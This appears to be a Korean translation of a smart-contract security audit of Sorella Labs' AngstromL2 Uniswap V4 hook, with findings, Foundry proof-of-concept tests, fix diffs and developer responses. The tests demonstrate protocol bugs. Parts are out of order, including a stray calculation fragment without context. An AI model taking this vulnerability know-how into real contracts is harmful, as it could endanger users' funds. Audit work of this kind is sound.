**Cyfrin:** 확인됨. 세금 금액은 블록 최상단 스왑에 대해서만 계산되며, 그렇지 않은 경우 권장대로 0이 전달됩니다.


### `hook-config.sol`이 `afterSwapReturnDelta` 권한을 인코딩하지 않아 동적 프로토콜 수수료가 활성화되면 모든 스왑이 되돌려짐

**설명:** 소유자가 동적 훅 프로토콜 수수료를 0이 아닌 값으로 구성하기 위해 `AngstromL2::setPoolHookSwapFee`를 호출하면 Uniswap V4 델타 회계가 `CurrencyNotSettled()`로 되돌려집니다.

이는 0이 아닌 수수료 델타가 훅에 회계 처리되기 때문에 발생합니다:

```solidity
    if (feeCurrencyId == NATIVE_CURRENCY_ID) {
        unclaimedProtocolRevenueInEther += fee.toUint128();
        UNI_V4.mint(address(this), feeCurrencyId, fee + taxInEther);
    } else {
        UNI_V4.mint(address(this), feeCurrencyId, fee);
        UNI_V4.mint(address(this), NATIVE_CURRENCY_ID, taxInEther);
    }
```

그러나 `hook-config.sol`은 `afterSwapReturnDelta` 권한이 훅 주소 내에 인코딩되어야 한다고 지정하지 않으므로, 이 없이 계약을 구성하는 것이 가능합니다:

```solidity
Hooks.validateHookPermissions(IHooks(address(this)), getRequiredHookPermissions());
```

이 누락으로 인해 권한은 거짓(false)이 되고 지정되지 않은 훅 델타가 파싱되지 않아 의도한 `afterSwap()` 반환 델타가 호출자 델타에 추가되지 않고 추가 프로토콜 수수료가 지불되지 않습니다.


```solidity
    if (self.hasPermission(AFTER_SWAP_FLAG)) {
        hookDeltaUnspecified += self.callHookWithReturnDelta(
            abi.encodeCall(IHooks.afterSwap, (msg.sender, key, params, swapDelta, hookData)),
            self.hasPermission(AFTER_SWAP_RETURNS_DELTA_FLAG)
        ).toInt128();
    }

    function callHookWithReturnDelta(IHooks self, bytes memory data, bool parseReturn) internal returns (int256) {
        bytes memory result = callHook(self, data);

        // 이 훅이 무언가를 반환하도록 의도되지 않았다면, 기본값 0 델타를 반환합니다.
        if (!parseReturn) return 0;

        // bytes4와 32바이트 델타를 반환하려면 64바이트 길이가 필요합니다.
        if (result.length != 64) InvalidHookResponse.selector.revertWith();
        return result.parseReturnDelta();
    }
```

**영향:** 동적 프로토콜 수수료가 활성화되면 모든 스왑이 되돌려집니다.

**개념 증명 (Proof of Concept):** 다음 테스트를 `AngstromL2.t.sol`에 추가해야 합니다.

```solidity
function test_cyfrin_SwapFeeNotSettledBecauseHookConfigMissing() public  {
    PoolKey memory key = initializePool(address(token), 10, 3);

    angstrom.setPoolHookSwapFee(key, 0.005e6); // 0.5%

    addLiquidity(key, 0, 10, 1e22);

    vm.expectRevert(bytes4(keccak256("CurrencyNotSettled()")));
    router.swap(key, true, -10e18, int24(0).getSqrtPriceAtTick());
}
```

**권장 완화 방법:** `getRequiredHookPermissions`에 `AFTER_SWAP_RETURNS_DELTA_FLAG`를 추가하십시오:

```diff
    function getRequiredHookPermissions() public pure override returns (Hooks.Permissions memory) {
        return Hooks.Permissions({
            beforeInitialize: true, 
            afterInitialize: true,
            beforeAddLiquidity: true,
            afterAddLiquidity: false,
            beforeRemoveLiquidity: true,
            afterRemoveLiquidity: false,
            beforeSwap: true,
            afterSwap: true,
            beforeDonate: false,
            afterDonate: false,
            beforeSwapReturnDelta: false,
-           afterSwapReturnDelta: false,
+           afterSwapReturnDelta: true,
            afterAddLiquidityReturnDelta: false,
            afterRemoveLiquidityReturnDelta: false
        });
    }
```

**Sorella Labs:** 커밋 [998a442](https://github.com/SorellaLabs/l2-angstrom/commit/998a44280f2c4176709f7df8549661e70e281512)에서 수정되었습니다.

**Cyfrin:** 확인됨.

\clearpage
## 낮은 위험 (Low Risk)


### 동적 LP 수수료는 명시적으로 업데이트되지 않는 한 기본적으로 0으로 유지됨

**설명:** `AngstromL2`는 풀 초기화 시 로드된 기본 LP 수수료 설정을 정의하지 않으므로, 호출자가 `AngstromL2::setPoolLPFee`를 통해 명시적으로 업데이트할 때까지 0으로 유지됩니다. 이는 Uniswap V4 사양에서 다소 벗어난 것으로, 동적 수수료 훅은 일반적으로 `afterInitialize`에서 기본 수수료를 초기화할 것으로 예상됩니다. 그러나 `AngstromL2::afterInitialize`는 주어진 풀의 수수료 설정을 업데이트하지 않습니다:

```solidity
function afterInitialize(address, PoolKey calldata key, uint160, int24, bytes calldata)
    external
    override
    returns (bytes4)
{
    _onlyUniV4();
    PoolId id = key.toId();
    rewards[id].initialize(id);
    return this.afterInitialize.selector;
}
```

또한 Angstrom은 이를 `Rewards::initialize`에서 내부적으로 처리하지 않으며, 이로 인해 `PoolRewards` 구조체의 `lpFee` 필드가 초기화되지 않은 상태로 남게 됩니다.

```solidity
function initialize(PoolRewards storage self, PoolId poolId) internal {
    self.poolId = poolId;
    self.globalGrowthX128 = 0;
}
```

**영향:** `AngstromL2`는 풀 초기화 후 LP 수수료를 0으로 유지합니다.

**권장 완화 방법:** `afterInitialize`에서 수수료를 적절한 기본값으로 초기화하십시오. 또는 풀 초기화 중에 `setPoolLPFee`를 호출하여 수수료가 올바르게 설정되도록 하십시오.

**Sorella Labs:** 확인됨.

**Cyfrin:** 확인됨.


### `TickIterator::_advanceToNextUp`은 초기화되지 않은 `endTick`을 설정하여 유효하지 않은 데이터를 읽을 수 있음

**설명:** `TickIterator::_advanceToNextUp`의 `TickIteratorUp` 구조체는 이전에 저장된 반환 데이터에서 메모리에 할당됩니다. 이는 `endTick` 필드가 0으로 초기화됨을 의미하며, `currentTick`이 음수이면 루프 조건 `self.currentTick < self.endTick`을 충족하여 루프가 실행됩니다. `endTick`은 비트맵 조회 범위를 제한하여 스토리지 읽기가 범위를 벗어나지 않도록 하고 `tickSpacing`이 1보다 클 때 정렬 문제를 방지하기 위한 것입니다.

`_advanceToNextUp`이 경계 틱 0이 있는 범위에서 호출되면, 예상되는 동작은 0이 발견될 때까지 또는 단어(word)의 끝에 도달할 때까지 비트맵을 검색하는 것입니다. 그러나 `endTick`이 0으로 초기화되면 `currentTick`이 음수인 경우 루프가 최소한 한 번 실행됩니다. 검색이 0을 지나치면 잘못된 데이터가 반환될 수 있습니다.

```solidity
function _advanceToNextUp(TickIteratorUp memory self) private view {
    // @audit self.endTick is 0
    while (self.currentTick < self.endTick) {
         // ...
    }
}
```

**영향:** `currentTick`이 음수인 상태로 초기화하면 반복자가 잘못된 동작을 하거나 잘못된 틱 데이터를 반환할 수 있으며, 이는 다운스트림 계산에 영향을 줄 수 있습니다.

**권장 완화 방법:** `TickIteratorUp` 구조체의 `endTick` 필드를 적절하게 초기화하십시오. 예를 들어, 반복자를 초기화할 때 원하는 끝 틱으로 설정하거나 `type(int24).max`로 설정하여 전체 범위를 허용하십시오.

**Sorella Labs:** 커밋 [998a442](https://github.com/SorellaLabs/l2-angstrom/commit/998a44280f2c4176709f7df8549661e70e281512)에서 수정되었습니다.

**Cyfrin:** 확인됨.


### `CompensationPriceFinder` 금액 델타 반올림 방향이 유효 가격을 편향시킴

**설명:** 양수 델타(0-for-1 스왑)에 대한 `CompensationPriceFinder::_getAmountDelta`는 다음과 같이 계산됩니다:

```solidity
amountOut = SqrtPriceMath.getAmount1Delta(priceLower, priceUpper, liquidity, true); // roundUp = true
```

음수 델타(1-for-0 스왑)의 경우:

```solidity
amountOut = SqrtPriceMath.getAmount0Delta(priceLower, priceUpper, liquidity, true); // roundUp = true
```

두 경우 모두 금액 델타는 올림(round up)됩니다. 그러나 유효 가격은 `amountOut / amountIn`으로 계산됩니다. 분자를 올림하면 유효 가격이 실제 가격보다 높게 편향됩니다. 보상을 계산할 때 이는 사용자가 받아야 할 것보다 더 적은 보상(0-for-1의 경우) 또는 더 많은 지불(1-for-0의 경우)을 초래할 수 있습니다. 특히 1-for-0 스왑의 경우 사용자가 지불하는 금액이 과대평가되어 더 적은 보상 토큰을 받게 될 수 있습니다.

**영향:** 유효 가격 계산이 편향되어 사용자에게 불공정한 보상 분배가 발생할 수 있습니다.

**권장 완화 방법:** 가격 계산의 정확성을 보장하기 위해 보함적인 반올림 방향을 사용하여 금액 델타를 계산하십시오.

**Sorella Labs:** 확인됨.

**Cyfrin:** 확인됨.


### `CompensationPriceFinder::getZeroForOne`은 유동성이 제거되었음에도 불구하고 더 작은 유효 가격을 계산할 수 있음

**설명:** `CompensationPriceFinder::getZeroForOne`에서 유효 가격은 시뮬레이션된 스왑 실행을 통해 결정됩니다.

```solidity
// Calculate amountIn and amountOut based on liquidity and price movement
uint256 amountIn = SqrtPriceMath.getAmount0Delta(step.sqrtPriceStartX96, step.sqrtPriceNextX96, state.liquidity, true);
uint256 amountOut = SqrtPriceMath.getAmount1Delta(step.sqrtPriceStartX96, step.sqrtPriceNextX96, state.liquidity, false);
```

이 로직은 표준 Uniswap V3 스왑 계산을 따릅니다. 그러나 보상 계산의 맥락에서, 유동성이 제거된 경우에도 이 가격 계산 방식이 항상 정확한 것은 아닙니다. 특히 틱 경계를 넘을 때 유동성 델타가 적용되어 유동성이 변경되는데, 이 과정에서 유동성 감소가 발생하면 이후 가격 이동에 더 큰 영향을 미칩니다. 즉, 동일한 양의 `amountIn`에 대해 더 큰 가격 변동이 발생하게 되어, 결과적으로 평균 실행 가격(유효 가격)이 예상보다 작아질 수 있습니다.

**영향:** 특정 시나리오, 특히 큰 유동성 변화가 있는 경우 유효 가격이 부정확하게 계산될 수 있습니다.

**권장 완화 방법:** 유효 가격 계산 로직을 검토하고 유동성 변화가 가격에 미치는 영향을 보다 정확하게 반영하도록 조정하십시오.

**Sorella Labs:** 확인됨.

**Cyfrin:** 확인됨.


### `TaxCalculator`에서 반올림으로 인한 먼지(dust)가 누적되어 자금이 잠길 수 있음

**설명:** `TaxCalculator`는 수수료와 세금을 계산할 때 나눗셈을 수행합니다. 예를 들어 `getSwapTaxAmount`는 다음과 같습니다:

```solidity
function getSwapTaxAmount(uint256 priorityFee) public pure returns (uint256) {
    return priorityFee * SWAP_TAX_RATE / 1e6;
}
```

이러한 계산에서 정수 나눗셈으로 인한 나머지(먼지)가 발생할 수 있습니다. 이 먼지는 `AngstromL2` 계약에 누적되어 인출할 수 없는 상태로 남게 될 수 있습니다. 시간이 지남에 따라 많은 수의 트랜잭션이 처리되면 이 금액이 상당히 커질 수 있습니다.

**영향:** 반올림 오차가 누적되어 프로토콜 내에 소량의 자금이 영구적으로 잠길 수 있습니다.

**권장 완화 방법:** 누적된 먼지를 수집하거나 재분배하는 메커니즘을 도입하십시오. 예를 들어, 주기적으로 누적된 먼지를 프로토콜 수수료로 청구하거나 LP에게 분배할 수 있습니다.

**Sorella Labs:** 확인됨.

**Cyfrin:** 확인됨.

\clearpage
## 정보성 (Informational)


### 가독성을 위해 사용자 정의 오류 조건문을 다시 작성할 수 있음

**설명:** 코드 전체에서 사용자 정의 오류가 `if` 문 내에서 사용됩니다.

```solidity
if (condition) revert CustomError();
```

최신 Solidity 버전이나 특정 라이브러리를 사용하면 이를 더 간결하게 표현할 수 있습니다. 예를 들어, `CustomError.selector.revertWith()` 패턴을 사용하면 가독성을 높일 수 있습니다 (Solady 라이브러리 등 사용 시).

**권장 완화 방법:**
*   `UniConsumer.sol`:
    *   `_validatePoolKey`에서 `InvalidCurrency` 및 `InvalidTickSpacing` 확인

**Sorella Labs:** 확인됨.

**Cyfrin:** 확인됨.


### `PoolRewards::updateAfterLiquidityAdd`에서 `rewardGrowthOutsideX128`이 올바르게 초기화되지 않음

**설명:** `PoolRewards::updateAfterLiquidityAdd`가 호출될 때, 틱이 초기화되지 않았으면 `rewardGrowthOutsideX128`을 0 으로 설정해야 합니다. 그러나 현재 구현은 이를 명시적으로 초기화하지 않을 수 있습니다. 틱이 처음 초기화될 때 `rewardGrowthOutsideX128` 값은 현재 `globalGrowthX128` (또는 관련 값)을 반영해야 할 수도 있습니다.

**권장 완화 방법:** 유동성이 추가될 때 틱 초기화 로직을 확인하고 `rewardGrowthOutsideX128`이 올바른 값으로 설정되도록 하십시오.

**Sorella Labs:** 커밋 [998a442](https://github.com/SorellaLabs/l2-angstrom/commit/998a44280f2c4176709f7df8549661e70e281512)에서 수정되었습니다.

**Cyfrin:** 확인됨.


### 사용되지 않는 imports

**설명:** 다음 파일에 사용되지 않는 import가 있습니다:

* `AngstromL2.sol`: `PoolIdLibrary`

**권장 완화 방법:** 사용되지 않는 import를 제거하십시오.

**Sorella Labs:** 수정되었습니다.

**Cyfrin:** 확인됨.


### `AngstromL2`의 `UNI_V4` 불변 변수는 `IProtocolFees` 대신 `IPoolManager`여야 함

**설명:** `AngstromL2`는 `UNI_V4`를 `IProtocolFees` 타입으로 저장하지만, 코드 내에서는 `IPoolManager`의 기능을 주로 사용합니다. `IPoolManager`는 `IProtocolFees`를 상속하므로 `IPoolManager` 타입을 사용하는 것이 더 정확하고 명시적입니다.

**권장 완화 방법:** `UNI_V4`의 타입을 `IPoolManager`로 변경하십시오.

**Sorella Labs:** 수정되었습니다.

**Cyfrin:** 확인됨.
- `rgo[10]`이 2만큼 증가하여 `12`가 되었습니다.
- `rgo[0]`은 (뒤집은 후) 1만큼 더 증가했습니다. `rgo[0] = 7 + 2 + 1 == 10`

```
    gi - lgi
== 10 - 12 - 997
== 998 - 997
== 1
```

이것은 이 로직을 언더플로로부터 보호하는 것이 외부 보상의 누적 성장임을 보여줍니다.

**개념 증명 (Proof of Concept):** 다음 테스트를 `AngstromL2.t.sol`에 추가해야 하며, 이는 `rewardGrowthOutsideX128`이 올바르게 초기화되지 않음을 보여줍니다:

```solidity
function test_cyfrin_IncorrectGrowthOutsideInitialization() public {
    uint256 PRIORITY_FEE = 0.7 gwei;
    PoolKey memory key = initializePool(address(token), 10, 7);

    angstrom.setPoolLPFee(key, 0.0005e6);
    addLiquidity(key, 0, 30, 10e21);
    bumpBlock();

    setPriorityFee(PRIORITY_FEE);

    // swap left and right to build up feeGrowthGlobal in both currencies
    router.swap(key, true,  -1000e18, int24(1).getSqrtPriceAtTick());
    bumpBlock();
    router.swap(key, false, -1000e18, int24(25).getSqrtPriceAtTick());

    setPriorityFee(0);
    bumpBlock();
    int24 tickLower = 10;
    int24 tickUpper = 20;
    addLiquidity(key, tickLower, tickUpper, 10e21);

    PoolId id = key.toId();

    // lower tick
    {
        (uint256 lowerFeeGrowthOutside0X128, uint256 lowerFeeGrowthOutside1X128) = StateLibrary.getTickFeeGrowthOutside(manager, id, tickLower);
        (uint256 lowerFeeGrowthGlobal0X128, uint256 lowerFeeGrowthGlobal1X128) = StateLibrary.getFeeGrowthGlobals(manager, id);
        uint256 lowerRewardGlobalGrowthX128 = angstrom.getRewardGlobalGrowthX128(id);
        uint256 lowerRewardGrowthOutsideX128 = angstrom.getRewardGrowthOutsideX128(id, tickLower);
        assertGt(lowerFeeGrowthGlobal0X128, 0);
        assertGt(lowerFeeGrowthGlobal1X128, 0);
        assertEq(lowerFeeGrowthOutside0X128, lowerFeeGrowthGlobal0X128);
        assertEq(lowerFeeGrowthOutside1X128, lowerFeeGrowthGlobal1X128);
        assertGt(lowerRewardGlobalGrowthX128, 0);
        /* BUG: lowerRewardGrowthOutsideX128 should be non-zero since lowerRewardGlobalGrowthX128 is non-zero! */
        assertEq(lowerRewardGrowthOutsideX128, 0);
    }

    // upper tick
    {
        (uint256 upperFeeGrowthOutside0X128, uint256 upperFeeGrowthOutside1X128) = StateLibrary.getTickFeeGrowthOutside(manager, id, tickUpper);
        (uint256 upperFeeGrowthGlobal0X128, uint256 upperFeeGrowthGlobal1X128) = StateLibrary.getFeeGrowthGlobals(manager, id);
        uint256 upperRewardGlobalGrowthX128 = angstrom.getRewardGlobalGrowthX128(id);
        uint256 upperRewardGrowthOutsideX128 = angstrom.getRewardGrowthOutsideX128(id, tickUpper);
        assertGt(upperFeeGrowthGlobal0X128, 0);
        assertGt(upperFeeGrowthGlobal1X128, 0);
        assertEq(upperFeeGrowthOutside0X128, upperFeeGrowthGlobal0X128);
        assertEq(upperFeeGrowthOutside1X128, upperFeeGrowthGlobal1X128);
        assertGt(upperRewardGlobalGrowthX128, 0);
        /* BUG: upperRewardGrowthOutsideX128 should be non-zero since upperRewardGlobalGrowthX128 is non-zero! */
        assertEq(upperRewardGrowthOutsideX128, 0);
    }
}
```

성공적으로 컴파일하려면 먼저 다음 import 문을 포함하십시오:

```solidity
import {StateLibrary} from "v4-core/src/libraries/StateLibrary.sol";
import {Position} from "../src/types/PoolRewards.sol";
```

다음으로, 다음 테스트 하네스를 포함하십시오:

```solidity
contract AngstromL2Harness is AngstromL2 {
    constructor(IPoolManager uniV4, address owner, IFlashBlockNumber flashBlockNumberProvider)
        AngstromL2(uniV4, owner, flashBlockNumberProvider)
    {}

    function getRewardGrowthOutsideX128(PoolId id, int24 tick) public returns (uint256) {
        return rewards[id].rewardGrowthOutsideX128[tick];
    }

    function getRewardLastGrowthInsideX128(PoolId id, address owner, int24 tickLower, int24 tickUpper, bytes32 salt) public returns (uint256) {
        (Position storage pos, ) = rewards[id].getPosition(owner, tickLower, tickUpper, salt);
        return pos.lastGrowthInsideX128;
    }

    function getRewardGlobalGrowthX128(PoolId id) public returns (uint256) {
        return rewards[id].globalGrowthX128;
    }
}
```

마지막으로 그에 따라 설정을 업데이트하십시오:

```solidity
AngstromL2Harness angstrom;
...
angstrom = AngstromL2Harness(
    deployAngstromL2(
        type(AngstromL2Harness).creationCode,
        IPoolManager(address(manager)),
        address(this),
        getRequiredHookPermissions(),
        IFlashBlockNumber(address(0))
    )
);
```

**권장 완화 방법:** 유동성을 추가하기 전에 `PoolRewards::updateAfterLiquidityAdd`를 호출하도록 `beforeAddLiquidity()` 훅 및 해당 권한을 구현하십시오.

**Sorella Labs:** 커밋 [cd0ac3c](https://github.com/SorellaLabs/l2-angstrom/commit/cd0ac3c1e8ad9ac1fc80820cb130b981429ca13d)에서 수정되었습니다.

**Cyfrin:** 확인됨. Uniswap 초기화 규칙이 누적 로직을 단순화하기 위해 완전히 제거되었습니다.

\clearpage
## 가스 최적화 (Gas Optimization)


### 불필요한 인라인 어셈블리 연산을 제거하고 하드코딩된 상수로 대체 가능

**설명:** `PoolKeyHelperLib::calldataToId`는 현재 슬라이스 길이를 계산할 때 불필요한 `mul` 연산을 두 번 수행합니다:

```solidity
function calldataToId(PoolKey calldata poolKey) internal pure returns (PoolId id) {
    assembly ("memory-safe") {
        let ptr := mload(0x40)
@>      calldatacopy(ptr, poolKey, mul(32, 5))
@>      id := keccak256(ptr, mul(32, 5))
    }
}
```

대신 160바이트 길이를 직접 참조하여 이러한 연산을 피할 수 있습니다.

마찬가지로 `PoolRewards::getPosition`은 현재 불필요한 `add` 연산을 세 번 수행합니다:

```solidity
positionKey := keccak256(12, add(add(3, 3), add(20, 32)))
```

대신 58바이트 길이를 직접 참조하여 이러한 연산을 피할 수 있습니다.

**권장 완화 방법:**
```diff
// PoolKeyHelperLib.sol
function calldataToId(PoolKey calldata poolKey) internal pure returns (PoolId id) {
    assembly ("memory-safe") {
        let ptr := mload(0x40)
-       calldatacopy(ptr, poolKey, mul(32, 5))
-       id := keccak256(ptr, mul(32, 5))
+       calldatacopy(ptr, poolKey, 160)
+       id := keccak256(ptr, 160)
    }
}

// PoolRewards.sol
function getPosition(
    PoolRewards storage self,
    address owner,
    int24 lowerTick,
    int24 upperTick,
    bytes32 salt
) internal view returns (Position storage position, bytes32 positionKey) {
    assembly ("memory-safe") {
        // Compute Uniswap position key `keccak256(abi.encodePacked(owner, lowerTick, upperTick, salt))`.
        mstore(0x06, upperTick)
        mstore(0x03, lowerTick)
        mstore(0x00, owner)
        // WARN: Free memory pointer temporarily invalid from here on.
        mstore(0x26, salt)
-       positionKey := keccak256(12, add(add(3, 3), add(20, 32)))
+       positionKey := keccak256(12, 58)
        // Upper bytes of free memory pointer cleared.
        mstore(0x26, 0)
    }
    position = self.positions[positionKey];
}
```

**Sorella Labs:** 인지함. 상수가 어디서 오는지 명확히 하기 위해 명시적인 add로 남겨두었습니다. 어쨌든 컴파일러는 컴파일 타임에 이를 상수로 쉽게 접을(fold) 것입니다.

**Cyfrin:** 확인됨.


### 불필요한 지역 변수 제거

**설명:** `AngstromL2`의 다음 함수들은 제거할 수 있는 불필요한 `priorityFee` 지역 변수를 할당합니다:

```diff
function _getSwapTaxAmount() internal view returns (uint256) {
-   uint256 priorityFee = tx.gasprice - block.basefee;
-   return getSwapTaxAmount(priorityFee);
+   return getSwapTaxAmount(tx.gasprice - block.basefee);
}

function _getJitTaxAmount() internal view returns (uint256) {
    if (_getBlock() == _blockOfLastTopOfBlock) {
        return 0;
    }
-   uint256 priorityFee = tx.gasprice - block.basefee;
-   return getJitTaxAmount(priorityFee);
+   return getJitTaxAmount(tx.gasprice - block.basefee);
}
```

`CompensationPriceFinder::getOneForZero` 내의 `simplePstarX96` 변수 또한 인라인하고 제거할 수 있습니다:

```diff
if (sumAmount0Deltas > taxInEther) {
-   uint256 simplePstarX96 = sumAmount1Deltas.divX96(sumAmount0Deltas - taxInEther);
-   if (simplePstarX96 <= uint256(priceUpperSqrtX96).mulX96(priceUpperSqrtX96)) {
+   if (
+       sumAmount1Deltas.divX96(sumAmount0Deltas - taxInEther)
+           <= uint256(priceUpperSqrtX96).mulX96(priceUpperSqrtX96)
+   ) {
        pstarSqrtX96 = _oneForZeroGetFinalCompensationPrice(
            liquidity,
            priceLowerSqrtX96,
            taxInEther,
            sumAmount0Deltas - delta0,
            sumAmount1Deltas - delta1
        );

        return (lastTick, pstarSqrtX96);
    }
}
```

**Sorella Labs:** 인지함. 가독성을 높여주며 가스 개선 효과가 미미하므로 변수를 그대로 둡니다.

**Cyfrin:** 확인됨.


### `AngstromL2::beforeInitialize` 조건문 결합 가능

**설명:** `AngstromL2::beforeInitialize`는 풀 키 내에서 동적 수수료와 네이티브 통화 지원 여부를 모두 검증합니다:

```solidity
function beforeInitialize(address, PoolKey calldata key, uint160)
    external
    view
    returns (bytes4)
{
    _onlyUniV4();
    if (key.currency0.toId() != NATIVE_CURRENCY_ID) revert IncompatiblePoolConfiguration();
    if (!LPFeeLibrary.isDynamicFee(key.fee)) revert IncompatiblePoolConfiguration();
    return this.beforeInitialize.selector;
}
```

이러한 조건문은 모두 동일한 `IncompatiblePoolConfiguration()` 사용자 정의 오류로 되돌려지므로 결합하여 가스를 절약할 수 있습니다.

**권장 완화 방법:**
```diff
function beforeInitialize(address, PoolKey calldata key, uint160)
    external
    view
    returns (bytes4)
{
    _onlyUniV4();
-   if (key.currency0.toId() != NATIVE_CURRENCY_ID) revert IncompatiblePoolConfiguration();
-   if (!LPFeeLibrary.isDynamicFee(key.fee)) revert IncompatiblePoolConfiguration();
+   if (key.currency0.toId() != NATIVE_CURRENCY_ID || !LPFeeLibrary.isDynamicFee(key.fee)) {
+       revert IncompatiblePoolConfiguration();
+   }
    return this.beforeInitialize.selector;
}
```

**Sorella Labs:** 인지함, 그대로 유지할 것입니다. 또한 가스 개선이 입증되지 않았고, `||`는 느긋한 평가(lazy evaluation)를 수행하며 solc가 최적화하는 방법을 모르기 때문에 어느 쪽이든 2개의 분기를 수행합니다.

**Cyfrin:** 확인됨.


### `AngstromL2::withdrawProtocolRevenue` 내의 불필요한 산술 검증 제거 가능

**설명:** `AngstromL2::withdrawProtocolRevenue`는 먼저 `unclaimedProtocolRevenueInEther`가 소유자의 `amount` 인출을 충당하기에 충분한지 검증합니다. 그러나 이는 필요하지 않으며 제거할 수 있습니다. 왜냐하면 후속 감소 연산이 언더플로로 인해 패닉(panic) 되돌림(revert)을 발생시키기 때문입니다.

```solidity
function withdrawProtocolRevenue(uint160 assetId, address to, uint256 amount) public {
    _checkOwner();

    if (assetId == NATIVE_CURRENCY_ID) {
@>      if (!(amount <= unclaimedProtocolRevenueInEther)) {
            revert AttemptingToWithdrawLPRewards();
        }
@>      unclaimedProtocolRevenueInEther -= amount.toUint128();
    }

    UNI_V4.transfer(to, assetId, amount);
}
```

**권장 완화 방법:**
```diff
function withdrawProtocolRevenue(uint160 assetId, address to, uint256 amount) public {
    _checkOwner();

    if (assetId == NATIVE_CURRENCY_ID) {
-       if (!(amount <= unclaimedProtocolRevenueInEther)) {
-           revert AttemptingToWithdrawLPRewards();
-       }
        unclaimedProtocolRevenueInEther -= amount.toUint128();
    }

    UNI_V4.transfer(to, assetId, amount);
}
```

**Sorella Labs:** 커밋 [ffb9fb2](https://github.com/SorellaLabs/l2-angstrom/commit/ffb9fb20e5b0afbf6996ef9528ef10acd8c94f91#diff-0e68badc81333f3e60fad8069459c6e57e1ac84f433fb40f23cda776b9f9442b)에서 수정되었습니다.

**Cyfrin:** 확인됨. 기본 통화로 지급되는 수익이 이제 ERC-6909 잔액으로 회계 처리되는 보상과 구별되므로 `unclaimedProtocolRevenueInEther`와 함께 검증이 제거되었습니다.


### `AngstromL2::_oneForZeroCreditRewards`는 유동성이 없는 경우 범위 보상 로직 실행을 건너뛰어야 함

**설명:** 블록 상단(top-of-block) 세금 보상을 입금할 때, `AngstromL2::_zeroForOneCreditRewards`는 주어진 범위에 유동성이 없으면 실행을 건너뜁니다:

```solidity
if (tickNext >= lastTick && liquidity != 0) {
```

그러나 `AngstromL2::_oneForZeroCreditRewards` 내의 동등한 조건은 잘못 구현되었습니다:

```solidity
if (tickNext <= lastTick || liquidity == 0) {
```

 이로 인해 주어진 범위에 유동성이 없을 때에도 범위 보상 계산 로직이 계속 실행됩니다. 이는 사실상 아무런 작업도 수행하지 않는 것(no-op)과 같습니다:

* `delta0`과 `delta1`은 둘 다 `0`으로 평가됩니다.
* 따라서 `rangeReward`도 `0`으로 할당됩니다.
* `taxInEther`는 변경되지 않은 상태로 유지됩니다.
* `cumulativeGrowthX128`도 변경되지 않은 상태로 유지되지만, 이는 `FixedPointMathLib::rawDiv`의 동작으로 인해 유동성이 0인 상태에서 호출될 때 `PoolRewardsLib::getGrowthDelta`가 0을 반환하여 되돌림(revert)을 간신히 피하기 때문에 거의 우발적인 것입니다.

```solidity
    function getGrowthDelta(uint256 reward, uint256 liquidity)
        internal
        pure
        returns (uint256 growthDeltaX128)
    {
        if (!(reward < 1 << 128)) revert RewardOverflow();
@>      return (reward << 128).rawDiv(liquidity);
    }
```

따라서 범위 내에 유동성이 없을 때는 이 로직을 건너뛰어야 합니다.

**개념 증명 (Proof of Concept):** 다음 독립 실행형 파일을 테스트 스위트에 추가해야 합니다:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/console2.sol";
import {Pretty} from "./_helpers/Pretty.sol";
import {PoolRewards, PoolRewardsLib} from "../src/types/PoolRewards.sol";
import {CompensationPriceFinder} from "../src/libraries/CompensationPriceFinder.sol";
import {TickIteratorLib, TickIteratorUp} from "../src/libraries/TickIterator.sol";
import {SqrtPriceMath} from "v4-core/src/libraries/SqrtPriceMath.sol";
import {Q96MathLib} from "../src/libraries/Q96MathLib.sol";
import {FixedPointMathLib} from "solady/src/utils/FixedPointMathLib.sol";
import {MixedSignLib} from "../src/libraries/MixedSignLib.sol";
import {Slot0} from "v4-core/src/types/Slot0.sol";

import {BaseTest} from "./_helpers/BaseTest.sol";
import {RouterActor} from "./_mocks/RouterActor.sol";
import {MockERC20} from "super-sol/mocks/MockERC20.sol";
import {UniV4Inspector} from "./_mocks/UniV4Inspector.sol";
import {IPoolManager} from "v4-core/src/interfaces/IPoolManager.sol";
import {PoolKey} from "v4-core/src/types/PoolKey.sol";
import {PoolId, PoolIdLibrary} from "v4-core/src/types/PoolId.sol";
import {Currency} from "v4-core/src/types/Currency.sol";
import {IHooks} from "v4-core/src/interfaces/IHooks.sol";
import {BalanceDelta} from "v4-core/src/types/BalanceDelta.sol";
import {TickMath} from "v4-core/src/libraries/TickMath.sol";
import {LPFeeLibrary} from "v4-core/src/libraries/LPFeeLibrary.sol";

import {AngstromL2} from "../src/AngstromL2.sol";
import {getRequiredHookPermissions, POOLS_MUST_HAVE_DYNAMIC_FEE} from "../src/hook-config.sol";
import {IUniV4} from "../src/interfaces/IUniV4.sol";

import {IFlashBlockNumber} from "src/interfaces/IFlashBlockNumber.sol";

contract AngstromL2RewardsTest is BaseTest {

    using PoolIdLibrary for PoolKey;
    using IUniV4 for UniV4Inspector;
    using IUniV4 for IPoolManager;
    using TickMath for int24;
    using Q96MathLib for uint256;
    using FixedPointMathLib for *;
    using MixedSignLib for *;

    using Pretty for *;

    UniV4Inspector manager;
    RouterActor router;
    AngstromL2 angstrom;

    MockERC20 token;

    uint160 constant INIT_SQRT_PRICE = 1 << 96; // 1:1 price
    int24[2][] positionRanges; // Track positions ranges added with addLiquidity helper
    mapping(PoolId id => PoolRewards) internal rewardsModified;
    mapping(PoolId id => PoolRewards) internal rewardsOriginal;

    function setUp() public {
        vm.roll(100);
        manager = new UniV4Inspector();
        router = new RouterActor(manager);
        vm.deal(address(router), 100 ether);

        token = new MockERC20();
        token.mint(address(router), 1_000_000_000e18);

        angstrom = AngstromL2(
            deployAngstromL2(
                type(AngstromL2).creationCode,
                IPoolManager(address(manager)),
                address(this),
                getRequiredHookPermissions(),
                IFlashBlockNumber(address(0))
            )
        );
    }

    function initializePool(address asset1, int24 tickSpacing, int24 startTick)
        internal
        returns (PoolKey memory key)
    {
        require(asset1 != address(0), "Token cannot be address(0)");

        key = PoolKey({
            currency0: Currency.wrap(address(0)),
            currency1: Currency.wrap(asset1),
            fee: POOLS_MUST_HAVE_DYNAMIC_FEE ? LPFeeLibrary.DYNAMIC_FEE_FLAG : 0,
            tickSpacing: tickSpacing,
            hooks: IHooks(address(angstrom))
        });

        manager.initialize(key, TickMath.getSqrtPriceAtTick(startTick));

        return key;
    }

    /// @notice Helper to add liquidity on a given tick range
    /// @param key The pool key
    /// @param tickLower The lower tick of the range
    /// @param tickUpper The upper tick of the range
    /// @param liquidityAmount The amount of liquidity to add
    function addLiquidity(
        PoolKey memory key,
